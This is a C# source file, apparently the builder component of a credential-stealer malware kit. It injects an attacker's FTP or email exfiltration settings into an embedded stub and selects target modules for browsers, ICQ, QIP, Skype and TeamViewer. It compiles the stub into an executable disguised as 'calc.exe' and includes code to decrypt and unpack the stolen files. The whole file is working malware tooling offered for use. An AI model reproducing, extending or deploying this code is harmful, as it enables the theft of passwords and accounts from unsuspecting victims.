using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.CSharp;
using Stealer.Extension;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;

namespace Stealer
{
    public partial class Stealer : Form
    {
        readonly string _pathCurrent = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

        private bool _isCheckBoxsChecked = true;
        Dictionary<string, byte[]> _files = null;

        private static readonly byte[] Key = { 123, 217, 19, 11, 24, 26, 85, 45, 114, 184, 27, 162, 37, 112, 222, 209, 241, 24, 175, 144, 173, 53, 196, 29, 24, 26, 17, 218, 131, 236, 53, 209 };
        private static readonly byte[] Vector = { 146, 64, 191, 111, 23, 3, 113, 119, 231, 121, 221, 112, 79, 32, 114, 156 };

        public Stealer()
        {
            InitializeComponent();
            SetToolTip();
        }

        #region Buttons
        private void button1_Click(object sender, EventArgs e)
        {
            var stringBuilder = GetResource(@"Stealer.STUB.Stub.cs");
            this.Replacer(stringBuilder);
            this.BuildServer(stringBuilder);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (_isCheckBoxsChecked)
            {
                this.CheckBoxes(_isCheckBoxsChecked);
                _isCheckBoxsChecked = false;
            }
            else
            {
                this.CheckBoxes(_isCheckBoxsChecked);
                _isCheckBoxsChecked = true;
            }
        }

        private void OpenFiletoolStripMenuItem1_Click(object sender, EventArgs e)
        {
            this.OpenFileMethod();
            this.SaveFileMethod();
        }
        #endregion

        private void CheckBoxes(bool isChecked)
        {
            cb_IE.Checked = isChecked;
            cb_Google.Checked = isChecked;
            cb_ICQ.Checked = isChecked;
            cb_FireFox.Checked = isChecked;
            cb_Opera.Checked = isChecked;
            cb_QIP.Checked = isChecked;
            cb_Safari.Checked = isChecked;
            cb_Skype.Checked = isChecked;
            cb_TeamViewer.Checked = isChecked;
        }

        private void BuildServer(StringBuilder stub)
        {
            var provOptions = new Dictionary<string, string> {{"CompilerVersion", "v3.5"}};
            var csProvider = new CSharpCodeProvider(provOptions);

            var cParameters = new CompilerParameters
            {
                GenerateExecutable = true,
                GenerateInMemory = true,
                OutputAssembly = "calc.exe"
            };
            cParameters.ReferencedAssemblies.Add("System.dll");
            cParameters.ReferencedAssemblies.Add("System.Core.dll");
            cParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            cParameters.ReferencedAssemblies.Add("mscorlib.dll");
            cParameters.CompilerOptions += "/filealign:0x00000200 /optimize+ /platform:anycpu /debug- /unsafe /t:winexe";

            CompilerResults r = csProvider.CompileAssemblyFromSource(cParameters, stub.ToString());
            if (!r.Errors.HasErrors)
            {
                MessageBox.Show(@"Build succeed!");
            }
            else
            {
                foreach (CompilerError err in r.Errors) MessageBox.Show(err.ToString());
            }
        }

        private void Replacer(StringBuilder stub)
        {
            if (cb_com_Ftp.Checked)
            {
                stub.Replace("[_ftpUrl]", tb_ftp_host.Text);
                stub.Replace("[_ftpUser]", tb_ftp_user.Text);
                stub.Replace("[_ftpPass]", tb_ftp_pass.Text);
                stub.Replace("_sendViaFtp = false", "_sendViaFtp = true");
            }
            if (cb_com_Email.Checked)
            {
                stub.Replace("[_emailFrom]", tb_email_from.Text);
                stub.Replace("[_emailPass]", tb_email_pass.Text);
                stub.Replace("[_emailTo]", tb_email_to.Text);
                stub.Replace("_sendViaEmail = false", "_sendViaEmail = true");
            }

            var replaceAdd = new StringBuilder();
            var replaceClass = new StringBuilder();
            var checkedBoxes = this.AllControls<CheckBox>().Where(c => !c.Text.Contains("-")).Where(c => c.Checked);
            foreach (CheckBox checkBox in checkedBoxes)
            {
                string className = checkBox.Text;
                replaceAdd.AppendLine(string.Format(@"_filesList.Add(new {0}());", className));
                var item = GetResource(string.Format(@"Stealer.Targets.{0}.cs", className));
                replaceClass.AppendLine(CutTheClass(item));
            }
            stub.Replace(@"//[Add_toList]", replaceAdd.ToString());
            stub.Replace(@"//[Class]", replaceClass.ToString());
        }

        private StringBuilder GetResource(string resourceName)
        {
            var stringBuilder = new StringBuilder();
            var assembly = Assembly.GetExecutingAssembly();
            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            {
                if (stream != null)
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        stringBuilder.Append(reader.ReadToEnd());
                    }
            }
            return stringBuilder;
        }

        private static string CutTheClass(StringBuilder stringBuilder)
        {
            string temp = stringBuilder.ToString();
            temp = temp.Substring(temp.IndexOf('{') + 1);
            temp = temp.Substring(0, temp.LastIndexOf('}'));
            return temp;
        }

        private void OpenFileMethod()
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog
            {
                InitialDirectory = _pathCurrent,
                Filter = @"dat files (*.dat)|*.dat|All files (*.*)|*.*",
                FilterIndex = 1,
                RestoreDirectory = true
            };

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                using (FileStream fs = new FileStream(openFileDialog1.FileName, FileMode.Open))
                {
                    using (MemoryStream ms1 = new MemoryStream())
                    {
                        fs.CopyTo(ms1);
                        using (MemoryStream ms2 = new MemoryStream(Decrypt(ms1.ToArray())))
                        {
                            try
                            {
                                BinaryFormatter formatter = new BinaryFormatter();
                                _files = (Dictionary<string, byte[]>)formatter.Deserialize(ms2);
                            }
                            catch (Exception exc)
                            {
                                MessageBox.Show(string.Format("Can't deserialize file\nError: {0}", exc.Message));
                            }
                        }
                    }
                }
            }
        }

        public static byte[] Decrypt(byte[] data)
        {
            MemoryStream ms = new MemoryStream();
            Rijndael alg = Rijndael.Create();
            alg.Key = Key;
            alg.IV = Vector;
            CryptoStream cs = new CryptoStream(ms,
            alg.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(data, 0, data.Length);
            cs.Close();
            byte[] decryptedData = ms.ToArray();
            return decryptedData;
        }

        private void SaveFileMethod()
        {
            if (_files != null)
            {
                FolderBrowserDialog saveFileDialog = new FolderBrowserDialog();

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string folderPath = saveFileDialog.SelectedPath;

                    bool exists = Directory.Exists(folderPath);
                    if (!exists)
                    {
                        Directory.CreateDirectory(folderPath);
                    }

                    foreach (KeyValuePair<string, byte[]> item in _files)
                    {
                        string filePath = string.Format(folderPath + @"\{0}", item.Key);
                        File.WriteAllBytes(filePath, item.Value);
                    }
                }
            }
        }

        private void SetToolTip()
        {
            ToolTip myToolTip = new ToolTip();
            myToolTip.SetToolTip(this.lb_ftp_host, @"exp: ftp://192.168.0.104:21/");
        }
    }
}
